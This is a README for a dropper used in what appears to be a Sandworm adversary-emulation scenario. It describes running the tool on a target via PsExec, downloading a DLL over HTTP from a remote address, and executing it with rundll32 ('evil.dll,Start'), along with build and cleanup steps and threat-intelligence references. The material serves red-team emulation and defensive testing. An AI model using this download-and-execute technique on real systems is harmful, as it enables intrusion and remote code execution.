# Exaramel Windows Dropper

This program is used in step5 of the sandworm scenario to download and execute Exaramel-Windows.dll.

This program is executed on target via PsExec.py.

This program then downloads the DLL via HTTP and URLDownloadToFile.

The downloaded DLL is then executed via the C standard library:

```C
system("rundll32.exe evil.dll,Start")
```


## Quick Start

Execute this program on Windows:

```
Usage:
    .\Exaramel-Windows-Dropper.exe <url> <file_path>

Example:
    .\Exaramel-windows-Dropper.exe http://192.168.0.4/getFile/Exaramel-Windows.dll .\Exaramel-Windows.dll
```

>Note: This program does not work with self-signed certificates unless you import the certificate on the target system first.

## Build Instructions

Download and install a C++ compiler: https://jmeubank.github.io/tdm-gcc/download/

Run the make.bat script from a terminal (cmd.exe):

```
make.bat
```

You should have 'Exaramel-Windows-Dropper.exe' in the current working directory.

## Cleanup Instructions

Delete Exaramel-Windows-Dropper.exe and any downloaded files.

Reboot the system to flush any DLL's from process memory.

## CTI Evidence

Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.

https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/